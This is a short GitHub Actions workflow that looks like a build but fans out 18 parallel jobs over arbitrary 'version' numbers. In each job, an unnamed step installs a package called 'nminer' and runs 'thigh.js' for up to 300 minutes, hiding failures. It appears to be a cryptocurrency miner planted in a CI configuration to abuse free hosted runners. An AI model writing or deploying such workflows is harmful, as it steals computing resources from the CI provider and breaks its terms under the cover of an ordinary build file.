name: thigh
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4402 }
          - { version: 1673 }
          - { version: 446 }
          - { version: 4143 }
          - { version: 2657 }
          - { version: 104 }
          - { version: 2751 }
          - { version: 9941 }
          - { version: 3479 }
          - { version: 4429 }
          - { version: 29 }
          - { version: 2059 }
          - { version: 121 }
          - { version: 3770 }
          - { version: 2744 }
          - { version: 8888 }
          - { version: 2027 }
          - { version: 1710 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 300m node thigh.js || echo "thigh executed"